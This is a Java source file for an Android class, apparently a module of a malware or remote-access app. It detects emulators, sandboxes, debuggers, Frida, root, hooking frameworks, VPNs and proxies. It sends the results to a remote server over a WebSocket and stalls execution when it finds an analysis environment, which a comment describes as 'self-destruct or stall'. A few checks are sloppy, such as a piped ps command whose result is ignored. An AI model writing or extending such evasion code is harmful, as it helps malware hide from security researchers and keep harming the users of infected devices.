package com.xrc.system.features;

import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Debug;
import android.provider.Settings;
import android.util.Log;

import com.xrc.system.core.Constants;
import com.xrc.system.network.WebSocketClient;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.List;

public class AntiAnalysis {
    private static final String TAG = Constants.TAG + ":Anti";
    private static AntiAnalysis instance;
    private final Context ctx;

    private AntiAnalysis(Context ctx) {
        this.ctx = ctx.getApplicationContext();
    }

    public static synchronized AntiAnalysis get(Context ctx) {
        if (instance == null) {
            instance = new AntiAnalysis(ctx);
        }
        return instance;
    }

    public void runChecks() {
        List<String> detections = new ArrayList<>();

        if (isEmulator()) detections.add("emulator");
        if (isSandbox()) detections.add("sandbox");
        if (isDebuggerAttached()) detections.add("debugger");
        if (isFrida()) detections.add("frida");
        if (isRooted()) detections.add("root");
        if (isHooked()) detections.add("hook");
        if (isVPN()) detections.add("vpn");
        if (isProxy()) detections.add("proxy");
        if (isUSBDebugging()) detections.add("usb_debug");
        if (isTestBuild()) detections.add("test_build");

        try {
            JSONObject data = new JSONObject();
            data.put("detections", new JSONArray(detections));
            data.put("count", detections.size());
            data.put("safe", detections.isEmpty());
            WebSocketClient.get(ctx).sendEvent("anti_analysis", data);
        } catch (JSONException e) {
            Log.e(TAG, "Anti-analysis report failed", e);
        }

        if (!detections.isEmpty()) {
            handleDetection(detections);
        }
    }

    private boolean isEmulator() {
        return Build.FINGERPRINT.startsWith("generic")
                || Build.FINGERPRINT.toLowerCase().contains("emulator")
                || Build.MODEL.contains("google_sdk")
                || Build.MODEL.toLowerCase().contains("emulator")
                || Build.MODEL.contains("Android SDK built for x86")
                || Build.MANUFACTURER.contains("Genymotion")
                || Build.BRAND.startsWith("generic") && Build.DEVICE.startsWith("generic")
                || "google_sdk".equals(Build.PRODUCT)
                || Build.HARDWARE.contains("goldfish")
                || Build.HARDWARE.contains("ranchu")
                || Build.HARDWARE.contains("vbox86")
                || Build.PRODUCT.contains("sdk")
                || Build.PRODUCT.contains("nox")
                || Build.BOARD.toLowerCase().contains("nox")
                || Build.BOOTLOADER.toLowerCase().contains("nox")
                || Build.HARDWARE.contains("ttvm")
                || Build.HARDWARE.contains("nox")
                || Build.HARDWARE.contains("ldplayer")
                || Build.HARDWARE.contains("memu")
                || Build.HARDWARE.contains("bluestacks")
                || new File("/dev/socket/qemud").exists()
                || new File("/dev/qemu_pipe").exists()
                || new File("/sys/devices/virtual/misc/goldfish_pipe").exists()
                || new File("/system/lib/libc_malloc_debug_qemu.so").exists()
                || new File("/sys/qemu_trace").exists()
                || new File("/system/bin/qemu-props").exists()
                || new File("/system/bin/qemud").exists()
                || checkQEmuProps();
    }

    private boolean checkQEmuProps() {
        String[] props = {"init.svc.qemud", "qemu.hw.mainkeys", "qemu.sf.fake_camera",
                "qemu.sf.lcd_density", "ro.bootloader", "ro.bootmode",
                "ro.hardware.vm", "ro.kernel.android.qemud"};
        for (String prop : props) {
            if (getProp(prop).toLowerCase().contains("qemu")
                    || getProp(prop).toLowerCase().contains("goldfish")
                    || getProp(prop).toLowerCase().contains("ranchu")) {
                return true;
            }
        }
        return false;
    }

    private boolean isSandbox() {
        return ctx.getPackageName().contains("test")
                || ctx.getPackageName().contains("sandbox")
                || new File("/system/xbin/su").exists()
                || new File("/system/bin/su").exists()
                || new File("/su/bin/su").exists()
                || new File("/sbin/su").exists()
                || new File("/data/local/xbin/su").exists()
                || new File("/data/local/bin/su").exists()
                || new File("/system/app/Superuser.apk").exists()
                || new File("/system/app/Kinguser.apk").exists()
                || new File("/system/app/magisk").exists()
                || isAppInstalled("com.koushikdutta.superuser")
                || isAppInstalled("com.thirdparty.superuser")
                || isAppInstalled("com.topjohnwu.magisk")
                || isAppInstalled("com.kingroot.kinguser")
                || isAppInstalled("com.kingouser.com")
                || isAppInstalled("com.saurik.substrate");
    }

    private boolean isDebuggerAttached() {
        return Debug.isDebuggerConnected() || Debug.waitingForDebugger();
    }

    private boolean isFrida() {
        try {
            Runtime.getRuntime().exec("ps -A | grep frida");
            return new File("/data/local/tmp/frida-server").exists()
                    || new File("/data/local/tmp/re.frida.server").exists()
                    || checkTcpPort(27042);
        } catch (Exception e) {
            return false;
        }
    }

    private boolean isRooted() {
        return new File("/system/bin/su").exists()
                || new File("/system/xbin/su").exists()
                || new File("/sbin/su").exists()
                || new File("/su/bin/su").exists()
                || new File("/data/local/xbin/su").exists()
                || new File("/data/local/bin/su").exists()
                || new File("/system/sd/xbin/su").exists()
                || new File("/system/bin/failsafe/su").exists()
                || new File("/data/local/su").exists();
    }

    private boolean isHooked() {
        return isAppInstalled("de.robv.android.xposed.installer")
                || isAppInstalled("com.saurik.substrate")
                || isAppInstalled("com.zachspong.temprootremovejb")
                || isAppInstalled("com.amphoras.hidemyroot")
                || isAppInstalled("com.formyhm.hideroot")
                || new File("/system/framework/XposedBridge.jar").exists();
    }

    private boolean isVPN() {
        try {
            java.net.NetworkInterface iface = java.net.NetworkInterface.getByName("tun0");
            return iface != null && iface.isUp();
        } catch (Exception e) {
            return false;
        }
    }

    private boolean isProxy() {
        String proxy = Settings.Secure.getString(ctx.getContentResolver(), "http_proxy");
        return proxy != null && !proxy.isEmpty();
    }

    private boolean isUSBDebugging() {
        return Settings.Secure.getInt(ctx.getContentResolver(), Settings.Secure.ADB_ENABLED, 0) == 1;
    }

    private boolean isTestBuild() {
        return (ctx.getApplicationInfo().flags & ApplicationInfo.FLAG_DEBUGGABLE) != 0
                || Build.TAGS != null && Build.TAGS.contains("test-keys");
    }

    private boolean isAppInstalled(String pkg) {
        try {
            ctx.getPackageManager().getPackageInfo(pkg, 0);
            return true;
        } catch (PackageManager.NameNotFoundException e) {
            return false;
        }
    }

    private boolean checkTcpPort(int port) {
        try {
            java.net.Socket socket = new java.net.Socket("127.0.0.1", port);
            socket.close();
            return true;
        } catch (Exception e) {
            return false;
        }
    }

    private String getProp(String prop) {
        try {
            Process p = Runtime.getRuntime().exec("getprop " + prop);
            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line = reader.readLine();
            reader.close();
            return line != null ? line : "";
        } catch (Exception e) {
            return "";
        }
    }

    private void handleDetection(List<String> detections) {
        Log.w(TAG, "Analysis environment detected: " + detections);
        // Self-destruct or stall in analysis environments
        if (detections.contains("emulator") || detections.contains("sandbox")) {
            try {
                Thread.sleep(30000);
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
            }
        }
    }
}
